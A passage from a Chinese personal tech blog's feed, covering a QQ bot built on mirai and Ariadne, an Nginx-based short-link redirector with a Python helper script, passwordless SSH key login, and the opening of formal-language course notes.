    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-zjFkMcxC" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1862798463" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>vaala的机器人小vaala已经做好很久了，功能也十分丰富。当时看了vaala的仓库，了解到qq机器人是用mirai这个框架实现的。</p><p>寒假放假后，7att1ce也很快写了一个机器人，主要实现了setu模块（</p><p>以下图片节选至530开车群。</p><p><img src="https://upyun.wuuconix.link/image-20220104193548146.png" alt="7att1ceのBot" /></p><p>我便也着手准备起来。</p><h2 id="成果"><a class="markdownIt-Anchor" href="#成果"></a> 成果</h2><p>在昨晚搞了一会儿MCL以及今天用Ariadne写了几个小功能后，我的机器人大概是这样的。</p><p><img src="https://upyun.wuuconix.link/image-20220104194022997.png" alt="help &amp; hi" /></p><p><img src="https://upyun.wuuconix.link/image-20220104194049060.png" alt="setu &amp; dice" /></p><p><img src="https://upyun.wuuconix.link/image-20220104194205371.png" alt="secret" /></p><p>当输入<code>#help</code> 时就会调用 <a href="https://api.ixiaowai.cn/api/api.php">https://api.ixiaowai.cn/api/api.php</a> 接口随机获得一张setu。</p><p>至于<code>#secret</code>实际上就是把setu以闪照的形式发出来233。</p><h2 id="如何实现"><a class="markdownIt-Anchor" href="#如何实现"></a> 如何实现</h2><p>mirai相关资料较少，建议仔细研读官方的文档和手册。以下为相关项目地址。</p><ol><li><p><a href="https://github.com/mamoe/mirai">mamoe/mirai: 高效率 QQ 机器人支持库 (github.com)</a></p><p>这是mirai主仓库，你需要按照它的用户手册下载Mirai Console Loader（即Mirai 控制台 加载器）</p><p>它有交互式终端，提供了一些命令，但是实际上的主要功能就是自动登录qq（</p><p><img src="https://upyun.wuuconix.link/image-20220104195217868.png" alt="mcl" /></p><p>登录qq是个大坑，建议看这篇 mirai官方论坛的文章 <a href="https://mirai.mamoe.net/topic/223/%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88?lang=zh-CN">无法登录的临时处理方案 | MiraiForum (mamoe.net)</a></p><p>大概步骤就是先用MiraiAndroid 登录上qq，然后复制device.json到服务器。然后服务器就能够登录了。</p></li><li><p>登录上qq了你便完成了一大半了。接下来就是如何对bot进行控制。Mirai官方提供了<a href="https://github.com/project-mirai/mirai-api-http">project-mirai/mirai-api-http: Mirai HTTP API (console) plugin (github.com)</a> 这款插件，它通过在机器本地开设http服务，让我们通过访问api接口的方式对机器人进行控制。这样有一个好处，无论你是什么语言，只要你可以去访问api，对api进行请求，你就实现对bot的操作。</p><p>下载插件十分简单，进入 plugins目录，然后把插件的jar包放进去，下次开启mcl的时候就会自动加载插件了。</p><p><img src="https://upyun.wuuconix.link/image-20220104200413119.png" alt="mirai-api-http" /></p><p>我这里下载了v2.4.0 即最新版本。</p><blockquote><p>注意 mirai主仓库提供的安装插件命令 ./mcl --update-package net.mamoe:mirai-api-http --type plugin --channel stable 下载的是插件的稳定版，实际上是v1. 的版本，不建议使用。</p></blockquote></li><li><p>接下来我找了一个mirai python框架 <a href="https://github.com/GraiaProject/Ariadne">GraiaProject/Ariadne: Another elegant framework for Mirai and mirai-api-http v2. Powered by GraiaProject. (github.com)</a> 用来编写bot功能。</p><p>在仔细阅读它的文档之后，我们很快就能实现一个简单的机器人。以下是我当前项目的代码。</p><p><img src="https://upyun.wuuconix.link/image-20220104200726529.png" alt="bot" /></p><p>由于该框架封装的比较好，用起来还是比较方便的。</p></li></ol><h2 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h2><p>一个QQ机器人还是非常有趣的，虽然用的频率可能不多。</p><p>但是它可能会给使群热闹起来。</p><p><img src="https://upyun.wuuconix.link/image-20220104201138164.png" alt="注入" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>mirai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx手动实现短链接</title>
    <link href="/2021/12/14/url/"/>
    <url>/2021/12/14/url/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-AfCbDDkJ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1901371647" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>有时候想要给同学分享一个链接，但是这个链接可能很长，就显得很难看。</p><p>以前我的解决办法是新建一个子域名，然后再Nginx配置文件里 rewrite 到那个链接。效果如下。</p><pre><code class=" mermaid">graph LR1((&quot;用户&quot;))2[(&quot;跳转到武丑兄的github页面&lt;br&gt;https://github.com/wuuconix&quot;)]3[(&quot;跳转到武丑兄的dockerhub页面&lt;br&gt;https://hub.docker.com/u/wuuconix&quot;)]1--&quot;通过git.wuucoinx.link&quot;--&gt;21--&quot;通过docker.wuucoinx.link&quot;--&gt;3</code></pre><p>实现主要利用的Nginx配置文件中的rewrite重写url。以下是 <code>git.wuuconix.link</code> 的配置文件。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  git.wuuconix.link;<br> <br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br> <br>   <span class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br> <br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl-link/fullchain.crt; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl-link/private.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br>   <br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://github.com/wuuconix <span class="hljs-literal">permanent</span>;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span>  git.wuuconix.link;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是随着需要需求的增加，二级域名已经变得难以满足了。</p><p>实际上之前我子托管过 <a href="https://github.com/YOURLS/YOURLS">YOURLS</a> ，Vaala还向我推荐过 <a href="https://github.com/thedevs-network/kutt">kutt</a>，但是我鉴于容器开起来需要占用资源，像YOURLS开需要开配套的数据库，很麻烦。</p><p>所以我便想用功能强大的Nginx手动实现一个满足实际需求的短链生成器。</p><h2 id="实现过程"><a class="markdownIt-Anchor" href="#实现过程"></a> 实现过程</h2><p>首先我预期实现的目标类似下图。</p><pre><code class=" mermaid">graph LR1((&quot;用户&quot;))2[(&quot;跳转到fomantic-UI文档&lt;br&gt;https://fomantic-ui.com/&quot;)]3[(&quot;跳转到mermaid在线编辑器&lt;br&gt;https://mermaid-js.github.io/mermaid-live-editor&quot;)]1--&quot;通过url.wuuconix.link/fomantic&quot;--&gt;21--&quot;通过url.wuuconix.link/mermaid&quot;--&gt;3</code></pre><p>这和之前用子域名来区分跳转的服务不同，现在是用着同一个子域名，即 <code>url.wuuconix.link</code>。</p><p>只不过是通过域名后面的路径来确定不同的跳转对象的。</p><p>经过搜索，发现Nginx中的 Location就能很好的实现功能。例子如下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  url.wuuconix.link;<br> <br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br> <br>   <span class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br> <br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl-link/fullchain.crt; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl-link/private.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br>   <br>   <span class="hljs-section">location</span> / &#123;<br>      <span class="hljs-attribute">root</span> /var/www/url;<br>      <span class="hljs-attribute">index</span> index.html;<br>   &#125;<br> <br>   <span class="hljs-section">location</span> = /mermaid &#123;<br>      <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://mermaid-js.github.io/mermaid-live-editor/ <span class="hljs-literal">permanent</span>;<br>   &#125;<br>   <br>   <span class="hljs-section">location</span> = /fomantic-ui &#123;<br>      <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://fomantic-ui.com/ <span class="hljs-literal">permanent</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span>  url.wuuconix.link;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="存在的问题"><a class="markdownIt-Anchor" href="#存在的问题"></a> 存在的问题</h2><ol><li>这样手动写貌似有点慢，最好能有一个程序接收我的长链接 和 我需要的短链接，然后自动帮我把配置文件写好。</li><li>缺少一个导航页，我很可能自己都忘记短链接有哪些，到时候分享给同学就很狼狈。</li></ol><h2 id="改进"><a class="markdownIt-Anchor" href="#改进"></a> 改进</h2><p>我写了一个python脚本，在终端接收我的长短链接，然后自动帮我设置。</p><p>此外我还写了个简单的导航。<a href="https://url.wuuconix.link">https://url.wuuconix.link</a></p><p>当然了，python脚本也会去实时跟新导航页的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readFromFile</span>(<span class="hljs-params">filename:<span class="hljs-built_in">str</span></span>)-&gt;<span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#读文件</span><br>        string = f.read()<br>        <span class="hljs-keyword">return</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeToFile</span>(<span class="hljs-params">filename:<span class="hljs-built_in">str</span>, content:<span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#读文件</span><br>        f.write(content)<br><br>short = sys.argv[<span class="hljs-number">1</span>]<br>url = sys.argv[<span class="hljs-number">2</span>]<br>description = sys.argv[<span class="hljs-number">3</span>]<br><br>rand = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">65535</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> <span class="hljs-comment">#随机添加到 左边还是右边</span><br><br>patternForConf = <span class="hljs-string">&quot;\n   location = /&quot;</span> + short +  <span class="hljs-string">&quot; &#123;\n      rewrite ^(.*) &quot;</span> + url + <span class="hljs-string">&quot; permanent;\n   &#125;\n   #continue&quot;</span><br>patternForHtml  = <span class="hljs-string">&#x27;&lt;div class=&quot;item&quot;&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">20</span> + <span class="hljs-string">&#x27;&lt;i class=&quot;map marker icon&quot;&gt;&lt;/i&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">20</span> + <span class="hljs-string">&#x27;&lt;div class=&quot;content&quot;&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">f&#x27;&lt;a class=&quot;header&quot; href=&quot;https://url.wuuconix.link/<span class="hljs-subst">&#123;short&#125;</span>&quot; target=&quot;_blank&quot;&gt;&#x27;</span> + <span class="hljs-string">f&quot;https://url.wuuconix.link/<span class="hljs-subst">&#123;short&#125;</span>&quot;</span> + <span class="hljs-string">&#x27;&lt;/a&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">&#x27;&lt;div class=&quot;description&quot;&gt;&#x27;</span> + description + <span class="hljs-string">&#x27;&lt;/div&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">20</span> + <span class="hljs-string">&#x27;&lt;/div&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">&#x27;&lt;/div&gt;\n&#x27;</span> \<br>                + <span class="hljs-string">&quot; &quot;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">f&#x27;&lt;!-- continue<span class="hljs-subst">&#123;rand&#125;</span> --&gt;&#x27;</span><br><br>filenameConf = <span class="hljs-string">&quot;/etc/nginx/sites-enabled/url.wuuconix.link.conf&quot;</span><br>filenameGuide = <span class="hljs-string">&quot;/var/www/url/index.html&quot;</span><br><br>conf = readFromFile(filenameConf)<br>conf = conf.replace(<span class="hljs-string">&quot;#continue&quot;</span>, patternForConf)<br>writeToFile(filenameConf, conf)<br><br>htmls = readFromFile(filenameGuide)<br>htmls = htmls.replace(<span class="hljs-string">f&quot;&lt;!-- continue<span class="hljs-subst">&#123;rand&#125;</span> --&gt;&quot;</span>, patternForHtml)<br>writeToFile(filenameGuide, htmls)<br></code></pre></td></tr></table></figure><h2 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h2><p>导航页：<a href="https://url.wuuconix.link">https://url.wuuconix.link</a></p><blockquote><p>希望能够帮到你！</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20211214212116162.png" alt="导航页预览" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>nginx</tag>
      
      <tag>短域名</tag>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用rsa公钥 免密登录Linux服务器</title>
    <link href="/2021/12/08/rsa-pub/"/>
    <url>/2021/12/08/rsa-pub/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-BTIofKKs" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1899425874" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>由于实验室远程检测的项目需要从实验室的机器上进行扫描，如果直接在宿舍用我的机械革命来扫描的话，按理来说是非法的。</p><p>一般情况下我都远程连接到的的实验室主机，然后开始扫描，为了提高效率，我都会同时开很多个终端类似这样。</p><p><img src="https://upyun.wuuconix.link/image-20211208131054674.png" alt="终端" /></p><p>但是每次去开新终端的时候，都需要输入密码来进行ssh连接。</p><p><img src="https://upyun.wuuconix.link/image-20211208131211546.png" alt="image-20211208131211546" /></p><p>有时候手贱很多次都输不对，今天便打算着手实现密钥登录，告别密码。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><ol><li><p>在windows主机上新建一个密钥</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>然后全部回车使用默认设置即可。</p><p><img src="https://upyun.wuuconix.link/image-20211208131447610.png" alt="生成密钥" /></p><p>图中框起来的就是rsa公钥了，我们需要将此公钥放到远程机器上。</p></li><li><p>可以利用scp命令将生成出来的公钥文件<code>id_rsa.pub</code>复制到你需要去远程的Linux主机的 .ssh文件夹里，并保存为<code>authorized_keys</code>文件。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">scp <span class="hljs-string">&quot;C:\Users\wuuconix/.ssh/id_rsa.pub&quot;</span> root<span class="hljs-meta">@wuuconix</span>.<span class="hljs-property">xyz</span>:<span class="hljs-regexp">/root/</span>.<span class="hljs-property">ssh</span>/authorized_keys<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20211208131553590.png" alt="scp" /></p></li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>简单的设置过后以后就能免去输入密码的烦恼啦！</p><p>(懒人武丑兄终于更新博客了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ssh</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>形式语言笔记</title>
    <link href="/2021/11/07/FA/"/>
    <url>/2021/11/07/FA/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-FtGeYdQH" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1464074707" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="第一章绪论"><a class="markdownIt-Anchor" href="#第一章绪论"></a> 第一章——绪论</h2><p>语言是某个集合中的元素，按照规则组合乘的符号串的集合。</p><h3 id="字母表"><a class="markdownIt-Anchor" href="#字母表"></a> 字母表</h3><p>字母表是一个非空有穷集合，字母表中的元素称为该字母表的一个字母 letter。又叫做符号 symbol 或者字符 character</p><p>字符的两个特性</p><ul><li>整体性 monolith 也叫做不可分性</li><li>可辨认性 distinguishable 也叫做可区分性。</li></ul><h3 id="字母表的乘积-product"><a class="markdownIt-Anchor" href="#字母表的乘积-product"></a> 字母表的乘积 Product</h3><p>如果是字母表<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∑</mo><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\sum_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span></span></span></span>和字母表<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∑</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\sum_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span></span></span></span>的乘积，则表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mi>a</mi><mi>b</mi><mtext> </mtext><mi mathvariant="normal">∣</mi><mtext> </mtext><mi>a</mi><mo>∈</mo><msub><mo>∑</mo><mn>1</mn></msub><mo separator="true">,</mo><mtext> </mtext><mi>b</mi><mo>∈</mo><msub><mo>∑</mo><mn>2</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{ab\ |\ a\in \sum_1,\ b\in \sum_2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mord">∣</span><span class="mspace"> </span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>。</p><p>实际上就是字母表1中取个字符，字母表2中取1个字符，然后去连接。实际上就是笛卡尔积嘛</p><h3 id="字母表的n次幂"><a class="markdownIt-Anchor" href="#字母表的n次幂"></a> 字母表的n次幂</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mn>0</mn></msup><mo>=</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\sum^0=\{\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.204018em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span></p><p>这个埃普西隆表示是由字母表中0个字符组成的。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>∑</mo><mi>n</mi></msup><mo>=</mo><msup><mo>∑</mo><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum^n=\sum^{n-1}\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.054302em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.204018em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span></p><h3 id="符号表的正闭包和克林闭包"><a class="markdownIt-Anchor" href="#符号表的正闭包和克林闭包"></a> 